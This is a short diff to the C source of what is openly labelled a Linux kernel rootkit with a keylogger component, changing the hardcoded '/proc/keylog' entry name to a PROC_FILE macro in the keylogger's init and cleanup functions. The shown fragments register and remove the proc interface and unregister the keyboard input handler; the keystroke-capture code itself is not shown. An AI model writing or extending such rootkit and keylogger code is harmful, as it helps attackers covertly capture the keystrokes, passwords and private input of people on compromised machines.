@@ -6,7 +6,6 @@
 #include <linux/bitops.h>
 #include <linux/proc_fs.h>
 #include <linux/seq_file.h>
-
 #include "rootkit.h"
 
 #define SUCCESS 0
@@ -203,7 +202,7 @@ int keylogger_init(void)
         return SUCCESS;
     }
     struct proc_dir_entry *entry;
-    entry = proc_create("keylog", 0400, NULL, &keylog_proc_ops);
+    entry = proc_create(PROC_FILE, 0400, NULL, &keylog_proc_ops);
     if (!entry) {
         DBG_PRINT("[Keylogger] Failed to create /proc/keylog\n");
         return -ENOMEM;
@@ -221,7 +220,7 @@ void keylogger_cleanup(void)
 {
     if (keylogger_initialized)
     {
-        remove_proc_entry("keylog", NULL);
+        remove_proc_entry(PROC_FILE, NULL);
         input_unregister_handler(&kb_input_handler);
         DBG_PRINT("[Keylogger] Keylogger unloaded\n");
     }
